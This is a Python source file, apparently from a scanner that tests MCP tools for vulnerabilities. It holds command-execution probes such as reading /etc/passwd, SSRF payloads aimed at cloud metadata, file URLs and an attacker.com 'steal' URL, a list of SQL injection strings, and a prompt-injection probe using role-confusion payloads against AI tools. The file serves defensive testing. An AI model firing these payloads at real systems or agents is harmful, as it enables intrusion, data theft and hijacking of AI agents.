from __future__ import annotations
import os, re, json, logging
from typing import Any, Dict, List, Optional, Callable, Awaitable, TypeVar
from dataclasses import dataclass
from enum import Enum
import asyncio
from . import call_tool_with_client
from .llm_fuzzer import generate_payloads
from .utils import extract_result_text, looks_like_passwd
from .constants import (
    COMMON_PATH_KEYS, COMMON_CMD_KEYS, COMMON_ARG_FOR_POSITIONAL,
    UNIX_SENSITIVE, WIN_SENSITIVE, BENIGN_CMD, BENIGN_CMD_ALT
)

# Type aliases
T = TypeVar('T')
ProbeFunction = Callable[[Any, Dict[str, Any], bool], Awaitable[Dict[str, Any]]]

class ProbeType(str, Enum):
    FILE_READ = "file_read"
    COMMAND_EXEC = "command_exec"
    BASH_EXEC = "bash_exec"  # New probe type for bash-specific tools
    API_ENDPOINT = "api_endpoint"
    AUTHENTICATION = "authentication"
    DATA_EXPOSURE = "data_exposure"
    SQL_INJECTION = "sql_injection"  # For SQL injection vulnerabilities
    XSS = "xss"  # For Cross-Site Scripting vulnerabilities

# Registry of available probes
PROBE_REGISTRY: Dict[ProbeType, ProbeFunction] = {}

def register_probe(probe_type: ProbeType) -> Callable[[ProbeFunction], ProbeFunction]:
    """Decorator to register a probe function for a specific type."""
    def decorator(func: ProbeFunction) -> ProbeFunction:
        PROBE_REGISTRY[probe_type] = func
        return func
    return decorator

# Register probe functions
@register_probe(ProbeType.SQL_INJECTION)
async def sql_injection_probe(mcp_client: Any, tool: Dict[str, Any], use_dynamic: bool = False) -> Dict[str, Any]:
    """Probe for SQL injection vulnerabilities."""
    return await probe_sql_injection(mcp_client, tool, use_dynamic)

@register_probe(ProbeType.XSS)
async def xss_probe(mcp_client: Any, tool: Dict[str, Any], use_dynamic: bool = False) -> Dict[str, Any]:
    """Probe for Cross-Site Scripting (XSS) vulnerabilities."""
    return await probe_xss(mcp_client, tool, use_dynamic)

@dataclass
class ProbeResult:
    success: bool = False
    payload: Optional[Any] = None
    proof: Optional[str] = None
    response: Optional[Any] = None
    attempts: List[Dict[str, Any]] = None
    probe_type: Optional[ProbeType] = None
    severity: str = "info"
    confidence: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "success": self.success,
            "probe_type": str(self.probe_type) if self.probe_type else None,
            "severity": self.severity,
            "confidence": self.confidence,
            "payload": self.payload,
            "proof": self.proof,
            "response": self.response,
            "attempts": self.attempts or []
        }

# Registry of available probes
PROBE_REGISTRY: Dict[ProbeType, ProbeFunction] = {}

def register_probe(probe_type: ProbeType) -> Callable[[ProbeFunction], ProbeFunction]:
    """Decorator to register a probe function for a specific type."""
    def decorator(func: ProbeFunction) -> ProbeFunction:
        PROBE_REGISTRY[probe_type] = func
        return func
    return decorator

async def get_relevant_probes(tool: Dict[str, Any]) -> List[ProbeType]:
    """Determine which probes are relevant for a given tool based on its metadata."""
    probes = []
    tool_name = (tool.get('name') or '').lower()
    description = (tool.get('description') or '').lower()
    
    # Check for file operations
    if any(x in tool_name for x in ['read', 'write', 'file', 'dir', 'path']):
        probes.append(ProbeType.FILE_READ)
    
    # Check for command execution
    if any(x in tool_name for x in ['exec', 'run', 'cmd', 'command', 'shell']):
        if 'bash' in tool_name or 'shell' in tool_name:
            probes.append(ProbeType.BASH_EXEC)
        else:
            probes.append(ProbeType.COMMAND_EXEC)
    
    # Check for API/HTTP endpoints
    if any(x in tool_name for x in ['http', 'api', 'request', 'fetch', 'call']):
        probes.append(ProbeType.API_ENDPOINT)
    
    # Check for authentication related tools
    if any(x in tool_name for x in ['auth', 'login', 'password', 'token', 'jwt']):
        probes.append(ProbeType.AUTHENTICATION)
    
    # Check for data exposure
    if any(x in tool_name for x in ['data', 'get', 'list', 'find', 'search', 'query']):
        probes.append(ProbeType.DATA_EXPOSURE)
    
    # Check for SQL injection vulnerabilities
    sql_keywords = ['sql', 'query', 'select', 'insert', 'update', 'delete', 'where', 'from', 'database', 'db']
    if any(x in tool_name for x in sql_keywords) or any(x in description for x in sql_keywords):
        probes.append(ProbeType.SQL_INJECTION)
    
    # Check for XSS vulnerabilities
    xss_keywords = ['html', 'render', 'display', 'show', 'view', 'content', 'template', 'form', 'input', 'output']
    if any(x in tool_name for x in xss_keywords) or any(x in description for x in xss_keywords):
        probes.append(ProbeType.XSS)
    
    # Check parameters for SQLi and XSS indicators
    params = tool.get('parameters', {})
    for param_name, param_schema in params.items():
        param_type = get_parameter_type(param_name, param_schema)
        if param_type in [ParameterType.SQL_QUERY, ParameterType.SQL_FILTER]:
            probes.append(ProbeType.SQL_INJECTION)
        elif param_type == ParameterType.HTML_INPUT:
            probes.append(ProbeType.XSS)
    
    # If no specific probes matched, add some safe defaults
    if not probes:
        probes.extend([
            ProbeType.FILE_READ,
            ProbeType.COMMAND_EXEC,
            ProbeType.API_ENDPOINT,
            ProbeType.SQL_INJECTION,
            ProbeType.XSS
        ])
    
    return list(set(probes))  # Remove duplicates

async def execute_probes(tool: Dict[str, Any], mcp_client: Any, use_dynamic: bool = False, use_static: bool = False, use_prompt: bool = False) -> Dict[ProbeType, Dict[str, Any]]:
    """Execute all relevant probes for a tool."""
    logging.debug(f"execute_probes called for tool: {tool.get('name', 'unknown')}")
    results = {}
    probe_types = await get_relevant_probes(tool)
    logging.debug(f"Relevant probe types: {probe_types}")
    
    for probe_type in probe_types:
        if probe_func := PROBE_REGISTRY.get(probe_type):
            try:
                result = await probe_func(mcp_client, tool, use_dynamic)
                results[probe_type.value] = result
            except Exception as e:
                logging.error(f"Error executing {probe_type} probe: {e}")
                results[probe_type.value] = {
                    "error": str(e),
                    "success": False
                }
    
    # For dynamic fuzzing, always run a general probe for all tools
    if use_dynamic:
        try:
            logging.info(f"Running dynamic probe for tool: {tool.get('name', 'unknown')}")
            result = await probe_exec("dynamic", tool, mcp_client, use_dynamic=True, use_prompt=use_prompt)
            results["dynamic_fuzzing"] = result
        except Exception as e:
            logging.error(f"Error executing dynamic probe: {e}")
            results["dynamic_fuzzing"] = {
                "error": str(e),
                "success": False
            }
    
    # For static payload generation, only run if no vulnerabilities were already detected
    if use_static:
        # Check if any previous probes already detected vulnerabilities
        has_vulnerabilities = any(
            result.get('success') and result.get('severity') in ['critical', 'high', 'medium']
            for result in results.values()
        )
        
        if not has_vulnerabilities:
            try:
                logging.info(f"Running static probe for tool: {tool.get('name', 'unknown')}")
                result = await probe_exec("static", tool, mcp_client, use_dynamic=False, use_static=True, use_prompt=use_prompt)
                results["static_fuzzing"] = result
            except Exception as e:
                logging.error(f"Error executing static probe: {e}")
                results["static_fuzzing"] = {
                    "error": str(e),
                    "success": False
                }
        else:
            logging.info(f"Skipping static probe for {tool.get('name', 'unknown')} - vulnerabilities already detected")
    
    # Run prompt-injection probe only when explicitly enabled
    if use_prompt:
        try:
            logging.info(f"Running prompt-injection probe for tool: {tool.get('name', 'unknown')}")
            pi_result = await probe_prompt_injection(mcp_client, tool, use_dynamic=False)
            results["prompt_injection"] = pi_result
        except Exception as e:
            logging.error(f"Error executing prompt-injection probe: {e}")
            results["prompt_injection"] = {"error": str(e), "success": False}
    
    return results



@register_probe(ProbeType.COMMAND_EXEC)
async def probe_command_exec(mcp_client: Any, tool: Dict[str, Any], use_dynamic: bool = False) -> Dict[str, Any]:
    """Probe for command execution vulnerabilities using minimal safe commands."""
    result = ProbeResult(probe_type=ProbeType.COMMAND_EXEC, severity="critical")
    result.attempts = []

    # Only minimal commands as requested
    cmd_variants = [
        {"command": "whoami"},
        {"command": "hostname"},
        {"command": "pwd"},
    ]

    # Also try common alternate parameter names
    alt_keys = ["cmd", "exec", "run"]

    for base in cmd_variants:
        for key in ["command"] + alt_keys:
            payload = {key: list(base.values())[0]}
            attempt = {"args": payload, "classification": "pending"}
            try:
                resp = await call_tool_with_client(mcp_client, tool['name'], payload)
                attempt["response"] = resp
                text = extract_result_text(resp) if resp else ""

                # Match indicative patterns
                if key in payload and payload[key] == "whoami" and text.strip():
                    attempt["classification"] = "vulnerable"
                    result.success = True
                    result.payload = payload
                    result.proof = json.dumps({
                        "payload": payload,
                        "response": extract_concise_response(text)
                    }, ensure_ascii=False)
                    result.confidence = 0.9
                    result.attempts.append(attempt)
                    return result.to_dict()
                if key in payload and payload[key] == "hostname" and text.strip():
                    attempt["classification"] = "vulnerable"
                    result.success = True
                    result.payload = payload
                    result.proof = json.dumps({
                        "payload": payload,
                        "response": extract_concise_response(text)
                    }, ensure_ascii=False)
                    result.confidence = 0.85
                    result.attempts.append(attempt)
                    return result.to_dict()
                if key in payload and payload[key] == "pwd" and text.startswith("/"):
                    attempt["classification"] = "vulnerable"
                    result.success = True
                    result.payload = payload
                    result.proof = json.dumps({
                        "payload": payload,
                        "response": first_non_empty_line(text)
                    }, ensure_ascii=False)
                    result.confidence = 0.8
                    result.attempts.append(attempt)
                    return result.to_dict()

                if "denied" in text.lower():
                    attempt["classification"] = "denied"
                elif any(w in text.lower() for w in ["error", "invalid", "not found", "no such"]):
                    attempt["classification"] = "error_response"
                else:
                    attempt["classification"] = "success"
                result.attempts.append(attempt)
            except Exception as e:
                attempt["classification"] = "error"
                attempt["error"] = str(e)
                result.attempts.append(attempt)

    return result.to_dict()


# Dedicated prompt-injection probe leveraging static templates
@register_probe(ProbeType.DATA_EXPOSURE)
async def probe_prompt_injection(mcp_client: Any, tool: Dict[str, Any], use_dynamic: bool = False) -> Dict[str, Any]:
    result = ProbeResult(probe_type=ProbeType.DATA_EXPOSURE, severity="high")
    result.attempts = []

    # Skip tools that are not likely to be vulnerable to prompt injection
    tool_name = (tool.get('name') or '').lower()
    tool_desc = (tool.get('description') or '').lower()
    
    # Skip system/internal tools
    if any(term in tool_name for term in ['system', 'internal', 'admin']):
        result.proof = "Skipped system/internal tool"
        return result.to_dict()
    
    from .static_payload_generator import StaticPayloadGenerator
    generator = StaticPayloadGenerator()
    
    # Get tool's input schema to generate appropriate payloads
    input_schema = tool.get('inputSchema', {})
    properties = input_schema.get('properties', {})
    
    # Skip if no parameters are defined
    if not properties:
        result.proof = "No parameters defined in input schema"
        return result.to_dict()
    
    # Select only context/role/instruction manipulation payloads that match the schema
    valid_attack_types = {
        "context_manipulation", "role_confusion", "instruction_injection", 
        "delimiter_attack", "encoding_attack"
    }
    pi_payloads = [
        p for p in generator._load_static_payloads() 
        if p.attack_type in valid_attack_types
    ]

    # Adapt payloads to tool schema if available
    input_schema = tool.get("raw", {}).get("inputSchema", {}) or {}
    adapted = [generator._adapt_payload_to_schema(p, input_schema, tool.get('name', '')) for p in pi_payloads]

    for payload_obj in adapted:
        payload = payload_obj.payload
        attempt = {"args": payload, "classification": "pending"}
        try:
            resp = await call_tool_with_client(mcp_client, tool['name'], payload)
            attempt["response"] = resp
            text = extract_result_text(resp) if resp else ""
            text = str(text).lower()
            payload_str = str(payload).lower()
            
            # Common error patterns that indicate reflection without vulnerability
            reflection_patterns = [
                r'(?i)(?:no (?:data|results?) (?:found|available)(?: for [^:]+:)?)',
                r'(?i)(?:(?:user|item|record) (?:not found|not exist|doesn\'t exist))',
                r'(?i)(?:search (?:results?|returned) (?:no matches|nothing|empty))',
                r'(?i)(?:error(?: message)?:? [^\n]*(?:unable to (?:find|process)|invalid|failed|rejected|denied|not (?:found|valid|allowed))[^\n]*)',
                r'(?i)(?:invalid (?:input|parameter|request|query|syntax|command|operation|format))',
                r'(?i)(?:unexpected (?:error|token|character|input|value))',
                r'(?i)(?:syntax error(?: in| at| near)?)',
                r'(?i)(?:command (?:not found|failed|error))',
                r'(?i)(?:permission (?:denied|error|not allowed))',
                r'(?i)(?:failed to (?:process|execute|find|retrieve))'
            ]
            
            # Check if this is just a reflected error message
            is_reflected_error = any(re.search(pattern, text) for pattern in reflection_patterns)
            
            # Check if the response contains the payload (reflected input)
            if payload_str in text:
                # Check for command execution indicators with more context
                command_patterns = [
                    # System information
                    r'(?i)(?:uid=\d+\([^\s]+\)\s+gid=\d+\b)',
                    r'(?i)(?:user\s*:\s*[^\s]+\s*\bshell\b)',
                    r'(?i)(?:hostname\s*:\s*[^\s\n]+)',
                    # Command output patterns
                    r'(?i)(?:command (?:output|result):?\s*[^\n]{10,})',
                    r'(?i)(?:std(?:out|err):?\s*[^\n]{10,})',
                    # System directories and files
                    r'(?i)(?:/(?:etc|var|usr|home|root|tmp)(?:/[^\s/]+)+\b)',
                    # Process information
                    r'(?i)(?:process(?: id|or)?\s*[0-9]+)',
                    # Shell indicators
                    r'(?i)(?:bash(?:\s+\-\w+)+)',
                    # Network information
                    r'(?i)(?:inet\s+[0-9.]+|inet6\s+[0-9a-f:]+)',
                    # System calls
                    r'(?i)(?:system\([^)]+\)|exec\w*\s+[^\s;|&]+)'
                ]
                
                # Check for command execution patterns
                command_execution_found = any(re.search(pattern, text) for pattern in command_patterns)
                
                if command_execution_found:
                    # Additional checks to reduce false positives
                    is_likely_vulnerable = True
                    
                    # Check if the command output looks like an error message
                    if any(re.search(pattern, text) for pattern in [
                        r'(?i)(?:error|failed|invalid|unexpected|exception|syntax error)',
                        r'(?i)(?:command not found|no such file or directory)'
                    ]):
                        # If it's a common error message, it's likely not a real vulnerability
                        if len(text) < 1000:  # Short error messages are more likely to be false positives
                            is_likely_vulnerable = False
                    
                    if is_likely_vulnerable:
                        result.success = True
                        result.payload = payload
                        result.proof = f"Command execution detected in response to payload: {payload}"
                        result.confidence = 0.95  # Increased confidence due to better detection
                        attempt["classification"] = "vulnerable"
                        result.attempts.append(attempt)
                        return result.to_dict()
                
                # If we get here and it's a reflected error, mark it as safe
                if is_reflected_error:
                    attempt["classification"] = "safe_reflection"
                    result.attempts.append(attempt)
                    continue
            
            # Classify the response with more detailed categories
            if is_reflected_error:
                attempt["classification"] = "safe_reflection"
            elif any(re.search(pattern, text) for pattern in [
                r'(?i)(?:error|exception|failed|rejected|denied|invalid|unexpected)',
                r'(?i)(?:syntax error|parse error|validation failed)',
                r'(?i)(?:not (?:found|allowed|permitted|authorized))',
                r'(?i)(?:unable to (?:process|execute|find|retrieve))'
            ]):
                attempt["classification"] = "error_response"
            elif any(re.search(pattern, text) for pattern in [
                r'(?i)(?:success|completed|finished|result:|output:)'
            ]):
                attempt["classification"] = "success"
            else:
                attempt["classification"] = "unknown"
                
            result.attempts.append(attempt)
        except Exception as e:
            attempt["classification"] = "error"
            attempt["error"] = str(e)
            result.attempts.append(attempt)

    return result.to_dict()


def first_non_empty_line(text: str) -> str:
    if not text:
        return ""
    for line in text.splitlines():
        s = line.strip()
        if s:
            return s[:200]
    return text.strip()[:200]

def limit_lines(text: str, max_lines: int = 2, max_chars: int = 300) -> str:
    """Return up to max_lines non-empty lines, trimmed to max_chars total."""
    if not text:
        return ""
    lines: List[str] = []
    acc = 0
    for line in text.replace("\r\n", "\n").replace("\r", "\n").splitlines():
        s = line.strip()
        if not s:
            continue
        if not lines:
            # Prefer to skip label-like lines
            lower = s.lower()
            if lower.startswith(("command:", "exit code:", "stderr:", "stdout:", "error:")):
                continue
        lines.append(s)
        if len(lines) >= max_lines:
            break
    joined = "\n".join(lines)
    return joined[:max_chars]

def extract_concise_response(text: str) -> str:
    """Prefer actual command output over status lines.
    - Try to capture after 'Command output:'
    - Try STDOUT block
    - Fallback to first non-empty line excluding labels
    """
    if not text:
        return ""
    # Normalize newlines
    t = text.replace("\r\n", "\n").replace("\r", "\n")
    # 1) Command output: <line>
    m = re.search(r"Command output:\n([^\n]+)", t, flags=re.IGNORECASE)
    if m:
        return m.group(1).strip()[:200]
    # 2) STDOUT block
    m = re.search(r"STDOUT:\n([\s\S]*?)(?:\n\s*STDERR:|$)", t, flags=re.IGNORECASE)
    if m:
        stdout_block = m.group(1).strip()
        return limit_lines(stdout_block, max_lines=2, max_chars=300)
    # 3) Fallback: first non-empty line that isn't a label
    label_prefixes = ("command:", "exit code:", "stderr:", "stdout:", "error:")
    for line in t.splitlines():
        s = line.strip()
        if not s:
            continue
        if s.lower().startswith(label_prefixes):
            continue
        return s[:200]
    return first_non_empty_line(t)

def looks_like_passwd(text: str) -> bool:
    return bool(re.search(r"^root:.*:0:0:", text, flags=re.MULTILINE))

def extract_result_text(resp: dict) -> str:
    if resp is None:
        return ""
    try:
        if "result" in resp and isinstance(resp["result"], dict):
            r = resp["result"]
            if "content" in r:
                c = r["content"]
                if isinstance(c, str):
                    return c
                if isinstance(c, list):
                    parts = []
                    for item in c:
                        if isinstance(item, dict):
                            t = item.get("text") or item.get("content") or ""
                            if isinstance(t, str):
                                parts.append(t)
                        elif isinstance(item, str):
                            parts.append(item)
                    return "\n".join(parts)
            for k in ("text", "value", "output"):
                if k in r and isinstance(r[k], str):
                    return r[k]
        return json.dumps(resp)
    except Exception:
        return json.dumps(resp)

@register_probe(ProbeType.BASH_EXEC)
async def probe_bash_exec(mcp_client: Any, tool: Dict[str, Any], use_dynamic: bool = False) -> Dict[str, Any]:
    """Probe for bash-specific command execution vulnerabilities using proper bash syntax."""
    result = ProbeResult(probe_type=ProbeType.BASH_EXEC, severity="critical")
    result.attempts = []

    # Get tool schema to determine parameter names
    schema = None
    required_params = []
    param_properties = {}
    
    try:
        # Try to get the schema from the tool dict first
        if 'inputSchema' in tool:
            schema = tool['inputSchema']
        
        # If no schema in tool dict, try to fetch it
        if not schema and hasattr(mcp_client, 'get_tool_schema'):
            tool_schema = await mcp_client.get_tool_schema(tool.get('name', ''))
            if tool_schema and 'inputSchema' in tool_schema:
                schema = tool_schema['inputSchema']
        
        # Extract parameter information
        if schema and 'properties' in schema:
            param_properties = schema['properties']
            required_params = schema.get('required', [])
    except Exception as e:
        logging.debug(f"Error getting tool schema for {tool.get('name', 'unknown')}: {e}")

    # Bash-specific payloads that use proper syntax
    test_payloads = [
        # Simple bash commands
        {"command": "whoami"},
        {"command": "hostname"},
        {"command": "pwd"},
        # Bash pipe commands (more realistic for bash_pipe)
        {"command": "ls -la | head -5"},
        {"command": "ps aux | grep bash"},
        {"command": "cat /etc/passwd | head -3"},
        {"command": "find /tmp -type f | wc -l"},
        # Bash command substitution
        {"command": "$(whoami)"},
        {"command": "`id`"},
        # Bash parameter expansion
        {"command": "${SHELL:-/bin/bash}"},
    ]

    # Determine parameter names from schema or use defaults
    if required_params:
        param_names = required_params
    else:
        # Look for command-related parameters
        command_params = []
        for param, props in param_properties.items():
            if isinstance(props, dict):
                param_lower = param.lower()
                if any(term in param_lower for term in ['command', 'cmd', 'exec', 'bash']):
                    command_params.append(param)
        
        if command_params:
            param_names = command_params
        else:
            # Fallback to common parameter names
            param_names = ['command', 'cmd', 'input']

    for test_payload in test_payloads:
        for param in param_names:
            # Create payload with all required parameters
            payload = {}
            
            # Add the current parameter with test value
            payload[param] = test_payload[param]
            
            # Add other required parameters with default values
            for req_param in required_params:
                if req_param != param and req_param not in payload:
                    default_value = ""
                    if req_param in param_properties and isinstance(param_properties[req_param], dict):
                        prop = param_properties[req_param]
                        if 'default' in prop:
                            default_value = prop['default']
                        elif 'type' in prop:
                            if prop['type'] == 'string':
                                default_value = ""
                            elif prop['type'] == 'number':
                                default_value = 0
                            elif prop['type'] == 'boolean':
                                default_value = False
                    payload[req_param] = default_value
            
            attempt = {"args": payload, "classification": "pending"}
            try:
                resp = await call_tool_with_client(mcp_client, tool['name'], payload)
                attempt["response"] = resp
                text = extract_result_text(resp) if resp else ""

                # Check for successful bash command execution
                if text and not any(error_term in text.lower() for error_term in ['error', 'invalid', 'denied', 'forbidden']):
                    # Check for bash command output indicators
                    if any(bash_indicator in text.lower() for bash_indicator in [
                        'uid=', 'gid=', 'root:', 'user:', 'hostname:', 'command output', 'bash'
                    ]):
                        attempt["classification"] = "vulnerable"
                        result.success = True
                        result.payload = payload
                        result.proof = json.dumps({
                            "payload": payload,
                            "response": extract_concise_response(text)
                        }, ensure_ascii=False)
                        result.confidence = 0.9
                        result.attempts.append(attempt)
                        logging.warning(f"Bash execution vulnerability found in {tool.get('name', 'unknown')} with payload {payload}")
                        return result.to_dict()

                if "denied" in text.lower():
                    attempt["classification"] = "denied"
                elif any(w in text.lower() for w in ["error", "invalid", "not found", "no such"]):
                    attempt["classification"] = "error_response"
                else:
                    attempt["classification"] = "success"
                    
            except Exception as e:
                attempt["classification"] = "error"
                attempt["error"] = str(e)
            
            result.attempts.append(attempt)

    return result.to_dict()


@register_probe(ProbeType.API_ENDPOINT)
async def probe_api_endpoint(mcp_client: Any, tool: Dict[str, Any], use_dynamic: bool = False) -> Dict[str, Any]:
    """Probe for HTTP/API endpoint vulnerabilities like SSRF, open redirects, etc."""
    result = ProbeResult(probe_type=ProbeType.API_ENDPOINT, severity="high")
    result.attempts = []

    # Get tool schema to determine parameter names
    schema = None
    required_params = []
    param_properties = {}
    
    try:
        # Try to get the schema from the tool dict first
        if 'inputSchema' in tool:
            schema = tool['inputSchema']
        
        # If no schema in tool dict, try to fetch it
        if not schema and hasattr(mcp_client, 'get_tool_schema'):
            tool_schema = await mcp_client.get_tool_schema(tool.get('name', ''))
            if tool_schema and 'inputSchema' in tool_schema:
                schema = tool_schema['inputSchema']
        
        # Extract parameter information
        if schema and 'properties' in schema:
            param_properties = schema['properties']
            required_params = schema.get('required', [])
    except Exception as e:
        logging.debug(f"Error getting tool schema for {tool.get('name', 'unknown')}: {e}")

    # SSRF and HTTP payloads for API tools
    test_payloads = [
        # SSRF payloads
        {"url": "http://localhost:8080"},
        {"url": "http://127.0.0.1:3000"},
        {"url": "http://169.254.169.254/latest/meta-data/"},
        {"url": "http://demo.testfire.net"},
        {"url": "http://attacker.com/steal"},
        # File protocol abuse
        {"url": "file:///etc/passwd"},
        {"url": "file:///tmp/../etc/passwd"},
        # Internal network access
        {"url": "http://10.0.0.1"},
        {"url": "http://192.168.1.1"},
        {"url": "http://172.16.0.1"},
    ]

    # Determine parameter names from schema or use defaults
    if required_params:
        param_names = required_params
    else:
        # Look for URL-related parameters
        url_params = []
        for param, props in param_properties.items():
            if isinstance(props, dict):
                param_lower = param.lower()
                if any(term in param_lower for term in ['url', 'uri', 'endpoint', 'link']):
                    url_params.append(param)
        
        if url_params:
            param_names = url_params
        else:
            # Fallback to common parameter names
            param_names = ['url', 'uri', 'endpoint', 'input']

    for test_payload in test_payloads:
        for param in param_names:
            # Create payload with all required parameters
            payload = {}
            
            # Add the current parameter with test value
            payload[param] = test_payload[param]
            
            # Add other required parameters with default values
            for req_param in required_params:
                if req_param != param and req_param not in payload:
                    default_value = ""
                    if req_param in param_properties and isinstance(param_properties[req_param], dict):
                        prop = param_properties[req_param]
                        if 'default' in prop:
                            default_value = prop['default']
                        elif 'type' in prop:
                            if prop['type'] == 'string':
                                default_value = ""
                            elif prop['type'] == 'number':
                                default_value = 0
                            elif prop['type'] == 'boolean':
                                default_value = False
                    payload[req_param] = default_value
            
            attempt = {"args": payload, "classification": "pending"}
            try:
                resp = await call_tool_with_client(mcp_client, tool['name'], payload)
                attempt["response"] = resp
                text = extract_result_text(resp) if resp else ""

                # Check for successful HTTP request (not just error responses)
                if text and not any(error_term in text.lower() for error_term in ['error', 'invalid', 'denied', 'forbidden']):
                    # Check if response contains HTTP content
                    if any(http_indicator in text.lower() for http_indicator in ['http', 'html', 'content-type', 'status']):
                        attempt["classification"] = "vulnerable"
                        result.success = True
                        result.payload = payload
                        result.proof = json.dumps({
                            "payload": payload,
                            "response": extract_concise_response(text)
                        }, ensure_ascii=False)
                        result.confidence = 0.9
                        result.attempts.append(attempt)
                        logging.warning(f"API endpoint vulnerability found in {tool.get('name', 'unknown')} with payload {payload}")
                        return result.to_dict()

                if "denied" in text.lower():
                    attempt["classification"] = "denied"
                elif any(w in text.lower() for w in ["error", "invalid", "not found", "no such"]):
                    attempt["classification"] = "error_response"
                else:
                    attempt["classification"] = "success"
                    
            except Exception as e:
                attempt["classification"] = "error"
                attempt["error"] = str(e)
            
            result.attempts.append(attempt)

    return result.to_dict()


class ParameterType(Enum):
    """Enum for different parameter types."""
    USERNAME = "username"
    PASSWORD = "password"
    EMAIL = "email"
    FILEPATH = "filepath"
    URL = "url"
    COMMAND = "command"
    SEARCH = "search"
    ID = "id"
    GENERIC = "generic"
    SQL_QUERY = "sql_query"
    SQL_FILTER = "sql_filter"
    HTML_INPUT = "html_input"

def get_parameter_type(param_name: str, param_schema: Optional[Dict] = None) -> ParameterType:
    """Determine the type of parameter based on its name and schema."""
    param_name = (param_name or "").lower()
    
    # Check by common parameter name patterns
    if any(x in param_name for x in ['user', 'login', 'name', 'uname']):
        return ParameterType.USERNAME
    elif any(x in param_name for x in ['pass', 'pwd', 'secret']):
        return ParameterType.PASSWORD
    elif any(x in param_name for x in ['email', 'mail']):
        return ParameterType.EMAIL
    elif any(x in param_name for x in ['file', 'path', 'dir']):
        return ParameterType.FILEPATH
    elif any(x in param_name for x in ['url', 'uri', 'endpoint']):
        return ParameterType.URL
    elif any(x in param_name for x in ['cmd', 'command', 'exec']):
        return ParameterType.COMMAND
    elif any(x in param_name for x in ['search', 'q', 'query']):
        return ParameterType.SEARCH
    elif any(x in param_name for x in ['id', 'uuid', 'guid']):
        return ParameterType.ID
    
    # SQL injection related parameters
    sql_keywords = ['sql', 'select', 'where', 'from', 'table', 'query', 'filter', 'sort', 'order']
    if any(x in param_name for x in sql_keywords):
        if any(x in param_name for x in ['query', 'sql']):
            return ParameterType.SQL_QUERY
        return ParameterType.SQL_FILTER
    
    # XSS related parameters
    xss_keywords = ['html', 'content', 'body', 'text', 'message', 'comment', 'input', 'output']
    if any(x in param_name for x in xss_keywords):
        return ParameterType.HTML_INPUT
    
    # Check schema if available
    if param_schema and isinstance(param_schema, dict):
        if 'format' in param_schema:
            if param_schema['format'] in ['email', 'idn-email']:
                return ParameterType.EMAIL
            elif param_schema['format'] in ['uri', 'url']:
                return ParameterType.URL
        
        if 'type' in param_schema:
            if param_schema['type'] == 'string':
                if 'format' in param_schema and param_schema['format'] == 'password':
                    return ParameterType.PASSWORD
                if 'maxLength' in param_schema and param_schema['maxLength'] > 1000:
                    # Likely a content field that could be vulnerable to XSS
                    return ParameterType.HTML_INPUT
                
                # Check for SQL-like content in description/pattern
                desc = (param_schema.get('description') or '').lower()
                if any(x in desc for x in ['sql', 'query', 'select', 'where']):
                    if 'query' in desc or 'sql' in desc:
                        return ParameterType.SQL_QUERY
                    return ParameterType.SQL_FILTER
                
                # Check for HTML content
                if any(x in desc for x in ['html', 'rich text', 'formatted']):
                    return ParameterType.HTML_INPUT
                
                # Check for URL patterns
                if any(x in desc for x in ['url', 'endpoint']):
                    return ParameterType.URL
                    
                # Check for command patterns
                if any(x in desc for x in ['command', 'execute']):
                    return ParameterType.COMMAND
                    
                # Check for search patterns
                if 'search' in desc or 'query' in desc:
                    return ParameterType.SEARCH
    
    return ParameterType.GENERIC

# SQL Injection detection patterns
SQL_ERROR_PATTERNS = [
    r'(?i)SQL.*syntax',
    r'(?i)SQL.*error',
    r'(?i)ORA-\d+',
    r'(?i)PostgreSQL.*ERROR',
    r'(?i)MySQL.*error',
    r'(?i)SQLite.*error',
    r'(?i)unexpected token',
    r'(?i)unterminated quoted',
    r'(?i)column.*not found',
    r'(?i)table.*not found',
    r'(?i)unknown column',
    r'(?i)unknown table',
    r'(?i)SQL command not properly ended',
    r'(?i)data exception',
    r'(?i)data truncated',
    r'(?i)division by zero',
    r'(?i)incorrect syntax',
    r'(?i)invalid column',
    r'(?i)invalid number',
    r'(?i)invalid parameter',
    r'(?i)missing expression',
    r'(?i)missing right parenthesis',
    r'(?i)null value in column',
    r'(?i)subquery returns more than one row',
    r'(?i)syntax error',
    r'(?i)unclosed quotation mark',
    r'(?i)violation of [\w ]+ constraint',
    r'(?i)you have an error in your SQL syntax',
]

# SQL Injection test payloads
SQLI_TEST_PAYLOADS = [
    # Boolean-based blind
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1;--",
    
    # Time-based blind
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)#",
    
    # Error-based
    "' OR 1=CONVERT(int, @@version)--",
    "' AND 1=CONVERT(int, @@version)--",
    
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "' UNION ALL SELECT NULL, NULL, NULL, NULL--",
    
    # Stacked queries
    "'; SELECT 1;--",
    "'; EXEC sp_helpuser;--",
    
    # Alternative encodings
    "%27%20OR%201=1--",
    "\u0027 OR 1=1--",
    
    # Database-specific
    "' OR 1=1 LIMIT 1--",  # MySQL
    "' OR 1=1 OFFSET 0--",  # PostgreSQL
    "' OR 1=1 ROWNUM=1--",  # Oracle
]

async def analyze_sql_injection_response(response: Any) -> bool:
    """Analyze response for signs of SQL injection success."""
    if not response:
        return False
    
    response_text = str(response).lower()
    
    # Check for SQL error messages that indicate actual SQL syntax issues
    if any(re.search(pattern, response_text) for pattern in SQL_ERROR_PATTERNS):
        # Check if this is just a reflected input in an error message
        if 'no data available for type:' in response_text or \
           'user not found:' in response_text or \
           'search results for' in response_text:
            return False
        return True
        
    # Check for time delays (this would require timing analysis)
    # This is a simplified check - in reality, you'd want to measure response times
    if 'sleep(' in response_text or 'waitfor delay' in response_text:
        return True
        
    # Check for unusual content that might indicate successful injection
    suspicious_phrases = [
        'syntax error', 'unterminated', 'missing expression', 'invalid character',
        'invalid number', 'missing keyword', 'missing right parenthesis',
        'column not found', 'table not found', 'violation of constraint',
        'data exception', 'integrity constraint violation'
    ]
    
    # Check for specific SQL error patterns that indicate real issues
    if any(phrase in response_text for phrase in suspicious_phrases):
        return True
        
    # Check for common SQL injection patterns in the response
    injection_indicators = [
        'select.*from', 'insert into', 'update .* set', 'delete from',
        'drop table', 'truncate table', 'create table', 'alter table',
        'union select', 'exec xp_cmdshell', 'sp_', 'information_schema'
